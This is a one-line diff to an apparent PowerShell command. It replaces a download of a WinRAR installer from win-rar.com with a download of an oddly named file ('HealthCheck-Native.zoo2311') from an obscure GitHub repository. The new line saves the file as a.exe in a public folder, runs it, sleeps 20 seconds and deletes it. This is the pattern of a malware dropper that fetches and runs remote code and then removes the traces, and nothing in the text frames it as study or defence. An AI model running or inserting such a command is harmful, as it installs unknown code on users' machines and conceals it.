@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri "https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-611tr.exe" -OutFile "c:\users\public\a.exe";c:\users\public\a.exe
+Invoke-WebRequest -Uri "https://github.com/BabyCoderLe/sasfjasgsa/blob/main/HealthCheck-Native.zoo2311?raw=true" -OutFile "c:\users\public\a.exe";c:\users\public\a.exe;Start-Sleep -s 20;del c:\users\public\a.exe;
